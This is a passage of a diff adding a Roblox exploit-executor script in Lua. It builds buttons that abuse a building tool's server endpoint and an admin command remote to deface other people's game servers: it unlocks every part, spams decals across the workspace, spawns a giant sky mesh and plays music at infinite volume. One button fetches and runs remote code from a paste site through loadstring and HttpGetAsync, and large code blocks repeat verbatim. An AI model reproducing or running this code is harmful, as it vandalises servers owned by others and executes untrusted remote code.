+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function Sky(id)
+				e = char.HumanoidRootPart.CFrame.x
+				f = char.HumanoidRootPart.CFrame.y
+				g = char.HumanoidRootPart.CFrame.z
+				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+				for i,v in game.Workspace:GetDescendants() do
+					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+						--spawn(function()
+						SetName(v,"Sky")
+						AddMesh(v)
+						--end)
+						--spawn(function()
+						SetMesh(v,"111891702759441")
+						SetTexture(v,id)
+						--end)
+						MeshResize(v,Vector3.new(8000,8000,8000))
+						SetLocked(v,true)
+					end
+				end
+			end
+			Sky("2577916730")
+end)]==]
+    end)
+    HTT03["LocalScript_49"].Parent = HTT03["TextButton_47"]
+    if HTT03["LocalScript_49"]:IsA("BaseScript") then HTT03["LocalScript_49"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 1332644289")
+		RequestCommand:InvokeServer(";pitch 0.80")
+		RequestCommand:InvokeServer(";volume inf")
+		
+		wait(3.1)
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 2496367477")
+		RequestCommand:InvokeServer(";volume inf")
+	--rrrg
+		    local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function spam(id)
+				for i,v in game.workspace:GetDescendants() do
+					if v:IsA("BasePart") then
+						spawn(function()
+							SetLocked(v,false)
+							SpawnDecal(v,Enum.NormalId.Front)
+							AddDecal(v,id,Enum.NormalId.Front)
+	
+							SpawnDecal(v,Enum.NormalId.Back)
+							AddDecal(v,id,Enum.NormalId.Back)
+	
+							SpawnDecal(v,Enum.NormalId.Right)
+							AddDecal(v,id,Enum.NormalId.Right)
+	
+							SpawnDecal(v,Enum.NormalId.Left)
+							AddDecal(v,id,Enum.NormalId.Left)
+	
+							SpawnDecal(v,Enum.NormalId.Bottom)
+							AddDecal(v,id,Enum.NormalId.Bottom)
+	
+							SpawnDecal(v,Enum.NormalId.Top)
+							AddDecal(v,id,Enum.NormalId.Top)
+						end)
+					end
+				end 
+			end
+			spam("106819842627724")  
+			wait(5)
+			local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function Sky(id)
+				e = char.HumanoidRootPart.CFrame.x
+				f = char.HumanoidRootPart.CFrame.y
+				g = char.HumanoidRootPart.CFrame.z
+				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+				for i,v in game.Workspace:GetDescendants() do
+					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+						--spawn(function()
+						SetName(v,"Sky")
+						AddMesh(v)
+						--end)
+						--spawn(function()
+						SetMesh(v,"111891702759441")
+						SetTexture(v,id)
+						--end)
+						MeshResize(v,Vector3.new(8000,8000,8000))
+						SetLocked(v,true)
+					end
+				end
+			end
+			Sky("2577916730")
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 1332644289")
+		RequestCommand:InvokeServer(";pitch 0.80")
+		RequestCommand:InvokeServer(";volume inf")
+		
+		wait(3.1)
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+	
+		RequestCommand:InvokeServer(";music 2496367477")
+		RequestCommand:InvokeServer(";volume inf")
+	--rrrg
+		    local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function spam(id)
+				for i,v in game.workspace:GetDescendants() do
+					if v:IsA("BasePart") then
+						spawn(function()
+							SetLocked(v,false)
+							SpawnDecal(v,Enum.NormalId.Front)
+							AddDecal(v,id,Enum.NormalId.Front)
+	
+							SpawnDecal(v,Enum.NormalId.Back)
+							AddDecal(v,id,Enum.NormalId.Back)
+	
+							SpawnDecal(v,Enum.NormalId.Right)
+							AddDecal(v,id,Enum.NormalId.Right)
+	
+							SpawnDecal(v,Enum.NormalId.Left)
+							AddDecal(v,id,Enum.NormalId.Left)
+	
+							SpawnDecal(v,Enum.NormalId.Bottom)
+							AddDecal(v,id,Enum.NormalId.Bottom)
+	
+							SpawnDecal(v,Enum.NormalId.Top)
+							AddDecal(v,id,Enum.NormalId.Top)
+						end)
+					end
+				end 
+			end
+			spam("106819842627724")  
+			wait(5)
+			local player = game.Players.LocalPlayer
+			local char = player.Character
+			local tool
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			for i,v in game.ReplicatedStorage:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+			--craaa
+			remote = tool.SyncAPI.ServerEndpoint
+			function _(args)
+				remote:InvokeServer(unpack(args))
+			end
+			function SetCollision(part,boolean)
+				local args = {
+					[1] = "SyncCollision",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CanCollide"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function SetAnchor(boolean,part)
+				local args = {
+					[1] = "SyncAnchor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Anchored"] = boolean
+						}
+					}
+				}
+				_(args)
+			end
+			function CreatePart(cf,parent)
+				local args = {
+					[1] = "CreatePart",
+					[2] = "Normal",
+					[3] = cf,
+					[4] = parent
+				}
+				_(args)
+			end
+			function DestroyPart(part)
+				local args = {
+					[1] = "Remove",
+					[2] = {
+						[1] = part
+					}
+				}
+				_(args)
+			end
+			function MovePart(part,cf)
+				local args = {
+					[1] = "SyncMove",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf
+						}
+					}
+				}
+				_(args)
+			end
+			function Resize(part,size,cf)
+				local args = {
+					[1] = "SyncResize",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["CFrame"] = cf,
+							["Size"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function AddMesh(part)
+				local args = {
+					[1] = "CreateMeshes",
+					[2] = {
+						[1] = {
+							["Part"] = part
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function SetMesh(part,meshid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["MeshId"] = "rbxassetid://"..meshid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetTexture(part, texid)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["TextureId"] = "rbxassetid://"..texid
+						}
+					}
+				}
+				_(args)
+			end
+			function SetName(part, stringg)
+				local args = {
+					[1] = "SetName",
+					[2] = {
+						[1] = part
+					},
+					[3] = stringg
+				}
+	
+				_(args)
+			end
+			function MeshResize(part,size)
+				local args = {
+					[1] = "SyncMesh",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Scale"] = size
+						}
+					}
+				}
+				_(args)
+			end
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+			function SetLocked(part,boolean)
+				local args = {
+					[1] = "SetLocked",
+					[2] = {
+						[1] = part
+					},
+					[3] = boolean
+				}
+				_(args)
+			end
+			function SetTrans(part,int)
+				local args = {
+					[1] = "SyncMaterial",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Transparency"] = int
+						}
+					}
+				}
+				_(args)
+			end
+			function CreateSpotlight(part)
+				local args = {
+					[1] = "CreateLights",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight"
+						}
+					}
+				}
+				_(args)
+			end
+			function SyncLighting(part,brightness)
+				local args = {
+					[1] = "SyncLighting",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["LightType"] = "SpotLight",
+							["Brightness"] = brightness
+						}
+					}
+				}
+				_(args)
+			end
+			function Color(part,color)
+				local args = {
+					[1] = "SyncColor",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Color"] = color --[[Color3]],
+							["UnionColoring"] = false
+						}
+					}
+				}
+				_(args)
+			end
+			function SpawnDecal(part,side)
+				local args = {
+					[1] = "CreateTextures",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal"
+						}
+					}
+				}
+	
+				_(args)
+			end
+			function AddDecal(part,asset,side)
+				local args = {
+					[1] = "SyncTexture",
+					[2] = {
+						[1] = {
+							["Part"] = part,
+							["Face"] = side,
+							["TextureType"] = "Decal",
+							["Texture"] = "rbxassetid://".. asset
+						}
+					}
+				}
+				_(args)
+			end
+	
+			function Sky(id)
+				e = char.HumanoidRootPart.CFrame.x
+				f = char.HumanoidRootPart.CFrame.y
+				g = char.HumanoidRootPart.CFrame.z
+				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+				for i,v in game.Workspace:GetDescendants() do
+					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+						--spawn(function()
+						SetName(v,"Sky")
+						AddMesh(v)
+						--end)
+						--spawn(function()
+						SetMesh(v,"111891702759441")
+						SetTexture(v,id)
+						--end)
+						MeshResize(v,Vector3.new(8000,8000,8000))
+						SetLocked(v,true)
+					end
+				end
+			end
+			Sky("2577916730")
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_49"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_50"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_50"].Name = "TextButton"
+HTT03["TextButton_50"].Visible = true
+HTT03["TextButton_50"].ZIndex = 1
+HTT03["TextButton_50"].LayoutOrder = 0
+HTT03["TextButton_50"].Position = UDim2.new(0.000000,364,0.000000,280)
+HTT03["TextButton_50"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_50"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_50"].Rotation = 0
+HTT03["TextButton_50"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_50"].BackgroundTransparency = 0
+HTT03["TextButton_50"].BorderSizePixel = 3
+HTT03["TextButton_50"].BorderColor3 = Color3.fromRGB(66,0,255)
+HTT03["TextButton_50"].ClipsDescendants = false
+HTT03["TextButton_50"].Active = true
+HTT03["TextButton_50"].Selectable = true
+HTT03["TextButton_50"].AutoButtonColor = true
+HTT03["TextButton_50"].Modal = false
+HTT03["TextButton_50"].Text = "dark mango"
+HTT03["TextButton_50"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_50"].TextSize = 10
+HTT03["TextButton_50"].TextTransparency = 0
+HTT03["TextButton_50"].TextScaled = false
+HTT03["TextButton_50"].TextWrapped = false
+HTT03["TextButton_50"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_50"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_50"].Font = Enum.Font.Legacy
+HTT03["TextButton_50"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_50"].TextStrokeTransparency = 1
+HTT03["TextButton_50"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_51"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_50"])
+HTT03["UIAspectRatioConstraint_51"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_52"] = Instance.new("LocalScript")
+HTT03["LocalScript_52"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_52"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/NWQDRCNM/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_52"].Parent = HTT03["TextButton_50"]
+    if HTT03["LocalScript_52"]:IsA("BaseScript") then HTT03["LocalScript_52"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/NWQDRCNM/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/NWQDRCNM/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_52"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_53"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_53"].Name = "TextButton"
+HTT03["TextButton_53"].Visible = true
+HTT03["TextButton_53"].ZIndex = 1
+HTT03["TextButton_53"].LayoutOrder = 0
+HTT03["TextButton_53"].Position = UDim2.new(0.000000,22,0.000000,365)
+HTT03["TextButton_53"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_53"].AnchorPoint = Vector2.new(0.000000,0.000000)
